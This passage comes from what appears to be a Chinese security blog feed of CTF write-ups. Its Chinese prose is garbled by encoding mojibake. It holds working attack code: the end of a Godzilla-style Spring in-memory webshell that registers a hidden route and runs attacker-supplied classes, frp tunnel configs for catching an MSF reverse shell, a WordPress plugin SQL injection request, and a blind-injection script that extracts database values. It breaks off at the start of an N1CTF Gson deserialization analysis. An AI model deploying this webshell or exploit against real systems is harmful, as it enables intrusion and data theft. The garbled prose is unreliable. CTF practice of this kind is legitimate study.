class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">readmethod</span> <span class="operator">=</span> gsl.class.getMethod(<span class="string">&quot;ls1&quot;</span>, HttpServletRequest.class,HttpServletResponse.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/ls1&quot;</span>).options(config).build();</span><br><span class="line">            <span class="type">gsl</span> <span class="variable">readfile_inject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">gsl</span>();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ls1</span><span class="params">(HttpServletRequest request,HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] data=base64Decode(request.getParameter(pass));</span><br><span class="line">        data=x(data, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line">        <span class="keyword">if</span> (session.getAttribute(<span class="string">&quot;payload&quot;</span>)==<span class="literal">null</span>)&#123;</span><br><span class="line">            session.setAttribute(<span class="string">&quot;payload&quot;</span>,defineClass(data));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            request.setAttribute(<span class="string">&quot;parameters&quot;</span>,data);</span><br><span class="line">            java.io.ByteArrayOutputStream arrOut=<span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayOutputStream();</span><br><span class="line">            Object f=((Class)session.getAttribute(<span class="string">&quot;payload&quot;</span>)).newInstance();</span><br><span class="line">            f.equals(arrOut);</span><br><span class="line">            f.equals(request);</span><br><span class="line">            response.getWriter().write(md5.substring(<span class="number">0</span>,<span class="number">16</span>));</span><br><span class="line">            f.toString();</span><br><span class="line">            response.getWriter().write(base64Encode(x(arrOut.toByteArray(), <span class="literal">true</span>)));</span><br><span class="line">            response.getWriter().write(md5.substring(<span class="number">16</span>));&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>çœ‹ç€çœ¼ç†Ÿå—,æ²¡é”™,å°±æ˜¯godzillağŸ.</p><p>ğŸ‘´åœ¨å¹¿ä¸ºæµä¼ çš„Springå†…å­˜ğŸçš„åŸºç¡€ä¸Š,å¼•å…¥äº†godzillağŸçš„é€»è¾‘.</p><h2 id="kali_tips"><span id="kali_tips"> kali_tips</span></h2><p>ä¹‹åè¿›è¡Œä¸€æ³¢MSFä¸Šçº¿,ä»€ä¹ˆ,ä½ è¯´kaliä¸å‡ºç½‘,æ²¡æ³•åå¼¹shell?ğŸ‘´æ¥å‘Šè¯‰ä½ æ€ä¹ˆåŠ.</p><p>é¦–å…ˆä½ éœ€è¦ä¸€ä¸ªå…¬ç½‘IP,ğŸ¤£ğŸ¤£ğŸ¤£ğŸ¤£ğŸ¤£</p><p>å…¬ç½‘ä¸Šèµ·ä¸ªfrps,frps.iniå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = <span class="number">7000</span></span><br><span class="line">dashboard_user = <span class="type">admin</span></span><br><span class="line"><span class="variable">dashboard_pwd</span> <span class="operator">=</span> frpadmin@<span class="number">2023</span></span><br><span class="line">dashboard_port = <span class="number">7500</span></span><br><span class="line">heartbeat_timeout = <span class="number">30</span></span><br><span class="line">token=frpToken<span class="meta">@admin2023</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = your_ip<span class="comment">//è¿™ä¸ªipæ˜¯ä»¥ç›®æ ‡é¶æœºèƒ½è®¿é—®åˆ°ä¸ºå‡†</span></span><br><span class="line">server_port = <span class="number">7000</span></span><br><span class="line">vhost_http_port = <span class="number">9001</span></span><br><span class="line">vhost_ssh_port = <span class="number">9002</span></span><br><span class="line">vhost_tcp_port = <span class="number">9003</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åç¡®ä¿kalièƒ½è®¿é—®ä½ çš„å…¬ç½‘ip,æ¥ç€kalièµ·frpc,é…ç½®å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr = ip<span class="comment">//è¿™ä¸ªipä»¥kalièƒ½è®¿é—®åˆ°ä¸ºå‡†</span></span><br><span class="line"></span><br><span class="line">server_port = <span class="number">7000</span>          </span><br><span class="line">token = frpToken<span class="meta">@admin2023</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[web]</span><br><span class="line">type = <span class="type">http</span></span><br><span class="line"><span class="variable">local_ip</span> <span class="operator">=</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">local_port = <span class="number">80</span>   </span><br><span class="line">custom_domains = <span class="type">ip</span></span><br><span class="line"><span class="variable">remote_port</span> <span class="operator">=</span> <span class="number">9001</span> </span><br><span class="line"></span><br><span class="line">#kali ssh</span><br><span class="line">[ssh]</span><br><span class="line">type = <span class="type">tcp</span></span><br><span class="line"><span class="variable">local_ip</span> <span class="operator">=</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">local_port = <span class="number">22</span></span><br><span class="line">custom_domains = <span class="type">ip</span></span><br><span class="line"><span class="variable">remote_port</span> <span class="operator">=</span> <span class="number">9002</span>  </span><br><span class="line"></span><br><span class="line">#tcp msfconsole</span><br><span class="line">[tcp]</span><br><span class="line">type = <span class="type">tcp</span></span><br><span class="line"><span class="variable">local_ip</span> <span class="operator">=</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">local_port = <span class="number">9003</span></span><br><span class="line">custom_domains = <span class="type">ip</span></span><br><span class="line"><span class="variable">remote_port</span> <span class="operator">=</span> <span class="number">9003</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¦æ³¨æ„åˆ°çš„æ˜¯,frpsçš„æœåŠ¡ipå’Œfrpcçš„æœåŠ¡ipä¸ä¸€æ ·.</p><p>åœ¨æ¸—é€çš„æ—¶å€™,å¾€å¾€æ˜¯windowsä¸»æœºè¿›å…¥å±€åŸŸç½‘,kaliä¸è¿›,é‚£ä¹ˆfrpsçš„ipé…ç½®å°±è¦ä»¥ä¸»æœºåœ¨å±€åŸŸç½‘ipä¸ºå‡†,è€Œfrpcçš„ipé…ç½®,ä»¥NATæ¨¡å¼é…ç½®çš„å±€åŸŸç½‘ä¸ºå‡†.</p><p>ç„¶åmsfç”Ÿæˆåå¼¹shellç›‘å¬ä¸Šçº¿å•¥çš„å°±ä¸æˆé—®é¢˜,ä¸è¿‡ipè¦è®¾ç½®æˆæ˜ å°„åçš„ip.</p><h1 id="ezpenetration"><span id="ezpenetration"> EzPenetration</span></h1><p>ä¸»è¦æ˜¯å­¦å­¦æ¸—é€çš„ä¸€äº›æŠ€å·§,wpscanåœ¨æ¸—é€ä¸­ä¼šè§åˆ°,å­¦ä¸€å­¦æ€ä¹ˆæ‰“</p><h2 id="æ‰«wp"><span id="æ‰«wp"> æ‰«wp</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://node4.buuoj.cn:<span class="number">27944</span>/ --api-token=xxxx</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1702610755014.png" alt="1702610755014"></p><p>å­˜åœ¨ç›²æ³¨</p><p><a href="https://wpscan.com/vulnerability/ba50c590-42ee-4523-8aa0-87ac644b77ed/">https://wpscan.com/vulnerability/ba50c590-42ee-4523-8aa0-87ac644b77ed/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">The below request will send an email to recipient@example.com <span class="keyword">with</span> <span class="built_in">all</span> user emails <span class="keyword">in</span> the <span class="string">&quot;Unregister from this event&quot;</span> URL</span><br><span class="line"></span><br><span class="line">POST /wp-admin/admin-ajax.php?action=rtec_send_unregister_link HTTP/<span class="number">1.1</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: en-GB,en;q=<span class="number">0.5</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-<span class="type">Type</span>: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">127</span></span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">event_id=<span class="number">3</span>%20UNION%20SELECT%<span class="number">200</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,group_concat(user_email)%<span class="number">20</span><span class="keyword">from</span>%20wp_users%<span class="number">20</span>--%20x&amp;email=recipient@example.com</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.buuoj.cn:26014/wp-admin/admin-ajax.php?action=rtec_send_unregister_link&#x27;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    begin = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> begin&lt;end:</span><br><span class="line">        payload = <span class="string">&quot;if((select ascii(substr((select group_concat(option_name,0x7e,option_value) from wp_options where option_id=16),&#123;&#125;,1)))&gt;&#123;&#125;,1,0)&quot;</span>.<span class="built_in">format</span>(i,tmp)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;event_id&quot;</span>:<span class="string">&quot;3 union select 0,1,2,3,4,5,6,7,8,(select database() where 1=(&#123;&#125;))--&quot;</span>.<span class="built_in">format</span>(payload),</span><br><span class="line">            <span class="string">&quot;email&quot;</span>:<span class="string">&quot;recipient@example.com&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            begin = tmp+<span class="number">1</span></span><br><span class="line">            tmp = (begin+end)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = tmp</span><br><span class="line">            tmp = (begin+end)&gt;&gt;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    flag+=<span class="built_in">chr</span>(tmp)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>copyä¸€ä¸‹è„šæœ¬,æ‹¿åˆ°</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://1llustrious.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>N1CTF_å¤ç°</title>
    <link href="https://1llustrious.github.io/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://1llustrious.github.io/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-12-01T00:48:46.000Z</published>
    <updated>2023-12-02T11:42:23.111Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- toc --><ul><li><a href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2">å†™åœ¨å‰é¢</a></li><li><a href="#strangeport">StrangePort</a><ul><li><a href="#%E5%88%86%E6%9E%90">åˆ†æğŸ¤”</a></li><li><a href="#gtmdapachemq">gtmdapachemq</a><ul><li><a href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">ç¯å¢ƒæ­å»º</a></li></ul></li><li><a href="#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">æµç¨‹åˆ†æ</a><ul><li><a href="#%E5%88%86%E6%9E%90%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E5%88%B0createthrowable">åˆ†æå¦‚ä½•åˆ©ç”¨åˆ°createThrowableğŸ˜Š</a><ul><li><a href="#java-message-servicejms">Java Message Service(JMS)</a></li></ul></li></ul></li><li><a href="#%E6%89%93tmd%E9%A2%98%E7%9B%AE">æ‰“tmdé¢˜ç›®ğŸ˜¡</a></li></ul></li><li><a href="#ez_maria">ez_maria</a><ul><li><a href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90">æºç åˆ†æ</a></li><li><a href="#udf%E5%86%99so">UDFå†™soğŸ¤ª</a></li><li><a href="#%E7%89%9B%E9%AD%94%E7%9A%84%E4%BB%80%E4%B9%88%E4%BA%8Bcapabilities%E6%9D%83%E9%99%90">ç‰›é­”çš„ä»€ä¹ˆäº‹capabilitiesæƒé™ğŸ˜“</a></li><li><a href="#%E5%85%B6%E4%B8%80">å…¶ä¸€</a></li><li><a href="#%E5%85%B6%E4%BA%8C">å…¶äºŒ</a></li><li><a href="#%E5%8A%AB%E6%8C%81php">åŠ«æŒphp</a></li></ul></li><li><a href="#ytiruces">ytiruces</a></li><li><a href="#ggbonds-gogs">ggbondâ€™s gogs</a></li><li><a href="#dockerdebug">dockerdebug</a></li></ul><!-- tocstop --><h1 id="å†™åœ¨å‰é¢"><span id="å†™åœ¨å‰é¢"> å†™åœ¨å‰é¢</span></h1><p>å¤ªé¡¶äº†è¿™æ¯”èµ›,è¿˜å¾—å¤ç°å­¦å¾ˆå¤šä¸œè¥¿.</p><p>ç¯å¢ƒ:</p><p><a href="https://github.com/Nu1LCTF/n1ctf-2023">GitHub - Nu1LCTF/n1ctf-2023</a></p><p>å‚è€ƒ:</p><p>[N1CTF 2023 Web èµ›åå¤ç° Writeup - Boogiepop Doesnâ€™t Laugh (<a href="http://boogipop.com">boogipop.com</a>)](<a href="https://boogipop.com/2023/11/06/N1CTF">https://boogipop.com/2023/11/06/N1CTF</a> 2023 Web èµ›åå¤ç° Writeup/#StrangePort)</p><p>[N1CTF 2023 writeup (<a href="http://qq.com">qq.com</a>)](<a href="https://mp.weixin.qq.com/s/HQgtWIVNFyt-uN-tJDTXAw#:~:text=ggbond's">https://mp.weixin.qq.com/s/HQgtWIVNFyt-uN-tJDTXAw#:~:text=ggbondâ€™s</a> ggos)</p><p><a href="https://mp.weixin.qq.com/s/uT7mPEoD2BRofuyDrOanZQ">2023n1ctf wp (qq.com)</a>  DJB!!!ğŸ˜ğŸ¥°</p><p>æˆ‘å¯å¤ªå–œæ¬¢å¤§Bè€å¸ˆäº†ğŸ¥µ,å—ä¸äº†!!!1,çˆ†äº†!</p><h1 id="strangeport"><span id="strangeport"> StrangePort</span></h1><p>å¼€äº†ä¸ªæœåŠ¡,é€šè¿‡nginxåä»£,é¢˜ç›®ä¸å‡ºç½‘,mdå°±è¿™ä¹ˆæƒ³æ¶å¿ƒğŸ‘´å—ğŸ˜…</p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699269926760-1701391479085-3.png" alt="1699269926760"></p><p>é¢˜ç›®ç»™çš„controller</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.api;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.google.gson.Gson;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/api&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">APIController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">APIController</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;try /api/com.api.Person/eyJuYW1lIjoidXNlciIsImFnZSI6IjIwIn0=&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&#123;&quot;/&#123;Person&#125;/&#123;Json&#125;&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> Person <span class="title function_">handleApiRequest</span><span class="params">(<span class="meta">@PathVariable</span> String Person, <span class="meta">@PathVariable</span> String Json)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Gson</span> <span class="variable">gson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person)gson.fromJson(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getDecoder().decode(Json), StandardCharsets.UTF_8), Class.forName(Person));</span><br><span class="line">        <span class="keyword">return</span> person;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”¨è‡ªå·±âˆšâ…§æƒ³æƒ³éƒ½çŸ¥é“è¦é€šè¿‡Gsonæ‰“ä¸€ä¸ªRCE.</p><h2 id="åˆ†æ"><span id="åˆ†æ"> åˆ†æğŸ¤”</span></h2><p>ä¸å¤šè¯´,å…ˆdebugçœ‹ä¸€ä¸‹èƒ½ä¸èƒ½å‡ºç‚¹ä»€ä¹ˆä¿¡æ¯.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.api.Person;</span><br><span class="line"><span class="keyword">import</span> com.google.gson.Gson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GsonDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, ClassNotFoundException, IOException &#123;</span><br><span class="line">        String Json=<span class="string">&quot;eyJscGNBbGxDb20iOlsidG91Y2ggL3RtcC9hYWFhYSIsInRvdWNoIC90bXAvYWFhYWEiXX0=&quot;</span>;</span><br><span class="line">        String Person=<span class="string">&quot;Person&quot;</span>;</span><br><span class="line">        <span class="type">Gson</span> <span class="variable">gson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>();</span><br><span class="line">        com.api.<span class="type">Person</span> <span class="variable">o</span> <span class="operator">=</span> (Person) gson.fromJson(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getDecoder().decode(Json), StandardCharsets.UTF_8), Class.forName(Person));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p>éšä¾¿ç»™ä¸ªbase64</p><p>æ¥ä¸ªPersonğŸ˜¤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="number">1111</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;john&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">age</span> <span class="operator">=</span> <span class="string">&quot;11&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;name=&#x27;&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;&#x27;, age=&#x27;&quot;</span> + <span class="built_in">this</span>.age + <span class="string">&quot;&#x27;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    Object <span class="title function_">writeReplace</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699271070059.png" alt="1699271070059"></p><p>å¯ä»¥çœ‹åˆ°æœ‰æ„é€ æ–¹æ³•,å°±ä¼šå»è°ƒç”¨,æ²¡æœ‰çš„è¯,å°±ä¼šè°ƒç”¨Unsafeå®ä¾‹åŒ–.</p><p>æ‰€ä»¥,æ€è€ƒä¸€ä¸‹æ€ä¹ˆé€šè¿‡constructåˆ°RCE.ğŸ˜¤</p><p>è¿™é‡Œå°±å¯ä»¥å°è¯•ç”¨ä¸€ä¸ª<code>PrintServiceLookupProvider</code>,äº‹å®ä¸Šåªè¦å®ç°äº†<code>PrintServiceLookup</code>ç±»çš„éƒ½è¡Œ.</p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699271625715-1701391479085-4.png" alt="1699271625715"></p><p>å†™ä¸ªdemoå»è°ƒè¯•ä¸€ä¸‹ğŸ¤£</p><figure class="highlight 